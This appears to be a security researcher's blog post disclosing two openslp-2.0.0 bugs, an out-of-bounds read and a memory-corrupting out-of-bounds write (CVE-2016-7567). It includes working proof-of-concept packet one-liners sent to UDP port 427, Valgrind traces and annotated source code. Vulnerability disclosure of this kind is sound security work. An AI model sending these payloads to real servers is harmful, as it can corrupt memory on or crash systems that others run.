@@ -1,0 +1,264 @@
+
+     _                        _     
+    / |   ___ ___ ___ ___ ___| |___ 
+ _ / /   | . | . | -_|   |_ -| | . |
+|_|_/    |___|  _|___|_|_|___|_|  _|
+             |_|               |_|  
+
+2018-11-07
+
+MORE BUGS IN OPENSLP-2.0.0
+==========================
+
+I discovered some bugs in openslp-2.0.0 back in January, 2018. 
+One of them I disclosed in June (dumpco.re/blog/openslp-2.0.0-double-free),
+and today I'm disclosing two more.
+
+
+BUG 1
+=====
+
+This issue is an OOB read that does not crash the application.
+So in terms of exploitation it is not very interesting. If that's what
+you're here for then scroll down to bug#2.
+After the occurence of the bug the application actually detects the error
+and ignores the malicious packet. Therefore, it could be argued that this
+is not a bug at all. Nevertheless, here it is:
+
+Proof of concept exploit:
+
+  echo -n "AgMAAAAAAAAAAAAAAAAAAPQAATEAAAAAB2VuAAAAF3M=" | base64 -d > /dev/udp/127.0.0.1/427
+
+Valgrind report:
+
+  ==27968== Invalid read of size 1
+  ==27968== at 0x412436: GetUINT16 (slp_message.c:63)
+  ==27968== by 0x4159C7: v2ParseSrvReg (slp_v2message.c:327)
+  ==27968== by 0x4159C7: SLPv2MessageParseBuffer (slp_v2message.c:1005)
+  ==27968== by 0x40BF4A: SLPDProcessMessage (slpd_process.c:1393)
+  ==27968== by 0x407139: IncomingDatagramRead (slpd_incoming.c:95)
+  ==27968== by 0x407139: SLPDIncomingHandler (slpd_incoming.c:420)
+  ==27968== by 0x40256B: main (slpd_main.c:699)
+  ==27968== Address 0x5b5c3f1 is 0 bytes after a block of size 81 alloc'd
+  ==27968== at 0x4C28C20: malloc (vg_replace_malloc.c:296)
+  ==27968== by 0x40FC1C: SLPBufferAlloc (slp_buffer.c:67)
+  ==27968== by 0x40FCBA: SLPBufferDup (slp_buffer.c:139)
+  ==27968== by 0x40BF7F: SLPDProcessMessage (slpd_process.c:1383)
+  ==27968== by 0x407139: IncomingDatagramRead (slpd_incoming.c:95)
+  ==27968== by 0x407139: SLPDIncomingHandler (slpd_incoming.c:420)
+  ==27968== by 0x40256B: main (slpd_main.c:699)
+
+Analysis:
+
+v2ParseSrvReg is responsible for parsing incoming requests. Various bytes
+are read from the packet and interpreted as integers used as length fields.
+One of them is the scopelistlen, parsed on line 321, and further used as
+argument for the amount of bytes to increment the buffer->curpos pointer
+in the the GetStrPtr function, shown below on line 112. It now points to
+uninitialized memory.
+
+The OOB read occurs in GetUINT16, called on line 327 where the buffer->curpos 
+pointer is dereferenced.
+
+Subsequently the comparison on line 329 evaluates to true since the
+buffer->curpos now points to memory located after the buffer->end
+pointer. The application therefore stops processing the malicious packet.
+
+  291 static int v2ParseSrvReg(SLPBuffer buffer, SLPSrvReg * srvreg)
+  292 {
+  293    int result;
+  294
+  295 /*  0                   1                   2                   3
+  296     0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+  297    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+  298    |                          <URL-Entry>                          \
+  299    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+  300    | length of service type string |        <service-type>         \
+  301    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+  302    |     length of <scope-list>    |         <scope-list>          \
+  303    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+  304    |  length of attr-list string   |          <attr-list>          \
+  305    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+  306    |# of AttrAuths |(if present) Attribute Authentication Blocks...\
+  307    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ */
+  308
+  309    /* Parse the <URL-Entry>. */
+  310    result = v2ParseUrlEntry(buffer, &srvreg->urlentry);
+  311    if (result != 0)
+  312       return result;
+  313
+  314    /* Parse the <service-type> string. */
+  315    srvreg->srvtypelen = GetUINT16(&buffer->curpos);
+  316    srvreg->srvtype = GetStrPtr(&buffer->curpos, srvreg->srvtypelen);
+  317    if (buffer->curpos > buffer->end)
+  318       return SLP_ERROR_PARSE_ERROR;
+  319
+  320    /* Parse the <scope-list> string. */
+  321    srvreg->scopelistlen = GetUINT16(&buffer->curpos);
+  322    srvreg->scopelist = GetStrPtr(&buffer->curpos, srvreg->scopelistlen);
+  323    if (buffer->curpos > buffer->end)
+  324       return SLP_ERROR_PARSE_ERROR;
+  325
+  326    /* Parse the <attr-list> string. */
+  327    srvreg->attrlistlen = GetUINT16(&buffer->curpos);
+  328    srvreg->attrlist = GetStrPtr(&buffer->curpos, srvreg->attrlistlen);
+  329    if (buffer->curpos > buffer->end)
+  330       return SLP_ERROR_PARSE_ERROR;
+ 
+   54 /** Extract a 16-bit big-endian buffer value into a native 16-bit word.
+   55  *
+   56  * @param[in,out] cpp - The address of a pointer from which to extract.
+   57  *
+   58  * @return A 16-bit unsigned value in native format; the buffer pointer
+   59  *    is moved ahead by 2 bytes on return.
+   60  */
+   61 uint16_t GetUINT16(uint8_t ** cpp)
+   62 {
+   63    uint16_t rv = AS_UINT16(*cpp);
+   64    *cpp += 2;
+   65    return rv;
+   66 }
+  ...
+   96 /** Extract a string buffer address into a character pointer.
+   97  *
+   98  * Note that this routine doesn't actually copy the string. It only casts
+   99  * the buffer pointer to a character pointer and moves the value at @p cpp
+  100  * ahead by @p len bytes.
+  101  *
+  102  * @param[in,out] cpp - The address of a pointer from which to extract.
+  103  * @param[in] len - The length of the string to extract.
+  104  *
+  105  * @return A pointer to the first character at the address pointed to by
+  106  *    @p cppstring pointer; the buffer pointer is moved ahead by @p len bytes
+  107  *    on return.
+  108  */
+  109 char * GetStrPtr(uint8_t ** cpp, size_t len)
+  110 {
+  111    char * sp = (char *)*cpp;
+  112    *cpp += len;
+  113    return sp;
+  114 }
+
+
+Proof of discovery: 
+
+  $ echo -n "AgMAAAAAAAAAAAAAAAAAAPQAATEAAAAAB2VuAAAAF3M=" | base64 -d | sha256sum
+  0d3f7a6e45a59def9097db4f103f95e4af2560bdb25853f9ee1c2e758c7d4946  -
+
+twitter.com/magnusstubman/status/953909628622069760
+
+
+Patch:
+
+I'm not aware of any patch, and I'm not sure the maintainers are going to patch it.
+
+BUG 2
+=====
+
+First and foremost, I'm not claiming credit for this bug since it was
+apparently discovered by Reno Robert and publicly disclosed on the
+oss-security mailing list on 2016-09-27 and awarded CVE-2016-7567
+the day after.
+
+openwall.com/lists/oss-security/2016/09/27/4
+openwall.com/lists/oss-security/2016/09/28/1
+
+Anyhow, I wasn't aware of the issue and found it by fuzzing, so I
+reported it to the maintainers who made me aware of the earlier discovery.
+What puzzled me was that no announcement had been made and the fact that
+the latest stable version on their website is still vulnerable! I found it
+2017-12-06 and reported it 2018-01-18. See further down for proof of
+discovery.
+
+I havn't been able to find any exploit for this bug anywhere. Therefore,
+I'm today disclosing a proof-of-concept exploit for the bug to increase
+attention on the issue.
+
+Exploit:
+
+  echo -n "AgkAAA8AAAAAAJuiAAAAAAAAAJtkaXJlYwB/ACssZVJlblxkZQkJCAkJ8wkJCQkJCYAJCQkJCWF0CQlkCQBkLCwsLEUsLCwsLCwsLCwsLCwsLCwsSCwsLCwsLIAsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCysLCwsLCwAAAPoLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCxcZGUJCQgJCfMJCQkJCQkJCQkJCQlhdAkJZAkAZCwsLCwsLCwsLCwsLA==" | base64 -d > /dev/udp/127.0.0.1/427
+
+Valgrind report:
+
+  ==56913== Invalid write of size 1
+  ==56913== at 0x4C2D6A3: memcpy@GLIBC_2.2.5 (vg_replace_strmem.c:914)
+  ==56913== by 0x40FD0B: SLPFoldWhiteSpace (slp_compare.c:210)
+  ==56913== by 0x4100DC: SLPCompareString (slp_compare.c:374)
+  ==56913== by 0x410331: SLPContainsStringList (slp_compare.c:514)
+  ==56913== by 0x4103C6: SLPIntersectStringList (slp_compare.c:550)
+  ==56913== by 0x40C606: ProcessSrvTypeRqst (slpd_process.c:1220)
+  ==56913== by 0x40C606: SLPDProcessMessage (slpd_process.c:1431)
+  ==56913== by 0x406F69: IncomingDatagramRead (slpd_incoming.c:94)
+  ==56913== by 0x406F69: SLPDIncomingHandler (slpd_incoming.c:406)
+  ==56913== by 0x402383: main (slpd_main.c:699)
+  ==56913== Address 0x5b5dd06 is 0 bytes after a block of size 6 alloc'd
+  ==56913== at 0x4C28C20: malloc (vg_replace_malloc.c:296)
+  ==56913== by 0x415C51: _xmemdup (slp_xmalloc.c:356)
+  ==56913== by 0x410096: SLPCompareString (slp_compare.c:365)
+  ==56913== by 0x410331: SLPContainsStringList (slp_compare.c:514)
+  ==56913== by 0x4103C6: SLPIntersectStringList (slp_compare.c:550)
+  ==56913== by 0x40C606: ProcessSrvTypeRqst (slpd_process.c:1220)
+  ==56913== by 0x40C606: SLPDProcessMessage (slpd_process.c:1431)
+  ==56913== by 0x406F69: IncomingDatagramRead (slpd_incoming.c:94)
+  ==56913== by 0x406F69: SLPDIncomingHandler (slpd_incoming.c:406)
+  ==56913== by 0x402383: main (slpd_main.c:699)
+
+The while loop on line 207 fails to perform bounds checking, and as such
+may end up incrementing the pointer p up to a point such that p is bigger
+than ep. Thus, the third argument to memmove on line 2010 becomes negative.
+However, since memmove accepts a size_t (which is unsigned) the value wraps
+around and becomes UINT_MAX or close to UINT_MAX resulting in memmove
+attempting to move an excessive amount of memory, resulting in OOB write.
+
+  184 /** fold internal white space within a string.
+  185  *
+  186  * folds all internal white space to a single space character within a
+  187  * specified string. modified the @p str parameter with the result and
+  188  * returns the new length of the string.
+  189  *
+  190  * @param[in] len - the length in bytes of @p str.
+  191  * @param[in,out] str - the string from which extraneous white space
+  192  *    should be removed.
+  193  *
+  194  * @return the new (shorter) length of @p str.
+  195  *
+  196  * @note this routine assumes that leading and trailing white space have
+  197  *    already been removed from @p str.
+  198  */
+  199 static int slpfoldwhitespace(size_t len, char * str)
+  200 {
+  201    char * p = str, * ep = str + len;
+  202    while (p < ep)
+  203    {
+  204       if (isspace(*p))
+  205       {
+  206          char * ws2p = ++p;         /* point ws2p to the second ws char. */
+  207          while (isspace(*p))        /* scan till we hit a non-ws char. */
+  208             p++;
+  209          len -= p - ws2p;           /* reduce the length by extra ws. */
+  210          memmove(ws2p, p, ep - p);  /* overwrite the extra white space. */
+  211       }
+  212       p++;
+  213    }
+  214    return (int)len;
+  215 }
+
+Proof of discovery:
+
+  $ echo -n "AgkAAA8AAAAAAJuiAAAAAAAAAJtkaXJlYwB/ACssZVJlblxkZQkJCAkJ8wkJCQkJCYAJCQkJCWF0CQlkCQBkLCwsLEUsLCwsLCwsLCwsLCwsLCwsSCwsLCwsLIAsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCysLCwsLCwAAAPoLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCxcZGUJCQgJCfMJCQkJCQkJCQkJCQlhdAkJZAkAZCwsLCwsLCwsLCwsLA==" | base64 -d | sha256sum
+  5bba9f9410bd4dffa4dc119477153002002db3fdd26a97080e43bfd95aeadb24  -
+
+twitter.com/magnusstubman/status/938317849474555904
+
+Patch: sourceforge.net/p/openslp/mercurial/ci/34fb3aa5e6b4997fa21cb614e480de36da5dbc9a 
+
+REFERENCES
+==========
+
+- sourceforge.net/p/openslp/bugs/161
+- sourceforge.net/p/openslp/bugs/160
+- twitter.com/magnusstubman/status/938317849474555904
+- twitter.com/magnusstubman/status/953909628622069760
+- sourceforge.net/p/openslp/mercurial/ci/34fb3aa5e6b4997fa21cb614e480de36da5dbc9a
+- openwall.com/lists/oss-security/2016/09/27/4
+- openwall.com/lists/oss-security/2016/09/28/1
